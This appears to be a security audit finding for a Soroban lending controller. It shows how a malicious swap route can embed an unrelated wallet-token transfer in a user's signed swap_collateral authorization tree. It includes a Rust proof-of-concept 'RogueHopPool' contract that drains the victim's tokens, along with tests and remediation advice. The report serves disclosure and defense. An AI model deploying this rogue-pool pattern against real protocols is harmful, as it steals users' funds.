### Title
Malicious swap routes can attach arbitrary wallet transfers to a user's signed `swap_collateral` authorization tree - (File: contracts/controller/src/strategies/swap.rs)

### Summary
A route supplied to `controller::swap_collateral` can place attacker-controlled contract code inside the user-authorized invocation. That code can call `token.transfer(victim, attacker, amount)` using the victim's authorization; Soroban simulation records it as a child invocation of the victim's `swap_collateral` authorization. If the victim signs the simulated tree, the attacker steals unrelated wallet tokens while the collateral swap still succeeds and passes the controller's measured-output checks. [1](#0-0) [2](#0-1) 

### Finding Description
`swap_collateral` authenticates `caller`, verifies that the caller owns or actively delegates `account_id`, and passes the user-supplied `swap` payload to `withdraw_and_swap_from_supply`. [3](#0-2) 

The shared swap helper sends the opaque route to the configured router. It correctly protects only the controller's own input grant by authorizing one exact `token_in.transfer(controller, router, amount_in)` invocation and measuring controller balances afterward. [4](#0-3) 

Those checks do not constrain other contracts invoked beneath the user's authorization. The router invokes payload-selected pool/token addresses without an allowlist, so a malicious "pool" can transfer any token held by the transaction's authorizing caller to an attacker-controlled recipient. [5](#0-4) 

The focused regression test demonstrates the exact authorization downgrade:

1. Alice calls `swap_collateral(alice, account_id, USDC, amount, ETH, malicious_route)`.
2. The route names an attacker-deployed pool.
3. During router execution, that pool calls `wallet_token.transfer(alice, attacker, balance)`.
4. Simulation records this unrelated transfer as a child of Alice's `swap_collateral` authorization.
5. If Alice signs the resulting tree, the wallet token is transferred to the attacker and the protocol still credits Alice's swapped ETH collateral. [6](#0-5) 

The same test proves that an honest root-only signature rejects the rogue transfer, while signing the simulated poisoned tree authorizes it. [7](#0-6) 

### Impact Explanation
This is theft of user funds. The stolen assets need not be part of the lending position, swap input, or swap output; any wallet token for which the malicious route can invoke `victim.require_auth()` under the signed tree can be drained. Neither the controller's positive-output check nor its final account-risk check bounds the loss because the theft is an unrelated token transfer embedded under the user's authorization. [5](#0-4) 

### Likelihood Explanation
An unprivileged attacker can deploy the malicious route contract, construct a route that produces acceptable swap output, and induce the victim to submit it through `swap_collateral`. The victim's signature requirement is a real mitigation, but wallets and clients commonly present the top-level action while making nested authorization details difficult to inspect. The repository's test shows standard simulation produces the poisoned tree and that signing it completes the theft. [8](#0-7) 

The analogous pattern also applies to other controller strategies that accept the same route payload and call `swap_tokens_or_passthrough`, including `swap_debt` and `repay_debt_with_collateral`, because the route is executed below the caller-authorized account operation. [9](#0-8) [10](#0-9) 

### Recommendation
Do not allow route-selected contracts to execute beneath the user's authorization scope for controller strategies. Prefer constraining router calls to an allowlisted venue interface that cannot make caller-authorized token transfers unrelated to the declared route. If arbitrary venues remain supported, the protocol boundary should isolate user authority—for example, require users to transfer only the explicit input to a controlled intermediary and ensure no nested invocation can request the user's authorization for unrelated token movement.

Clients should additionally decode `swap` XDR and reject any simulated authorization tree containing unexpected child invocations. The expected tree for a controller strategy should contain only the controller's self-authorized input movement and must not include a caller-funded token transfer to a route contract or external recipient. [5](#0-4) 

### Proof of Concept
The repository contains a focused executable proof in `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs`.

Its malicious pool stores `(victim, wallet_token, attacker, amount)` and performs:

```rust
token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
```

from `RogueHopPool::swap` when invoked by the route. [11](#0-10) 

The test then records Alice's authorization for `swap_collateral` and observes the unrelated wallet-token transfer as a child invocation. After execution, Alice's wallet balance is zero, the attacker receives `WALLET_BALANCE`, and Alice receives the expected swapped collateral. [6](#0-5) 

The enforcing-mode test confirms that the same transaction fails with a root-only authorization tree but succeeds when Alice signs the simulation-produced tree containing the malicious child transfer. [12](#0-11)

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L29-54)
```rust
    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });

    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L50-71)
```rust
/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-268)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}

#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-64)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
```

**File:** docs/explanation/threat-model.md (L154-164)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
```

**File:** contracts/controller/src/strategies/swap_debt.rs (L65-72)
```rust
    let repay_amount = swap_tokens_or_passthrough(
        env,
        caller,
        &new_debt.asset,
        amount_received,
        &existing_debt.asset,
        swap,
    );
```

**File:** contracts/controller/src/lib.rs (L311-331)
```rust
    fn repay_debt_with_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        collateral: HubAssetKey,
        collateral_amount: i128,
        debt: HubAssetKey,
        swap: Bytes,
        close_position: bool,
    ) {
        strategies::repay_debt_with_collateral::process_repay_debt_with_collateral(
            &env,
            &caller,
            RepayWithCollateralParams {
                account_id,
                collateral: &collateral,
                collateral_amount,
                debt: &debt,
                swap: &swap,
                close_position,
            },
```
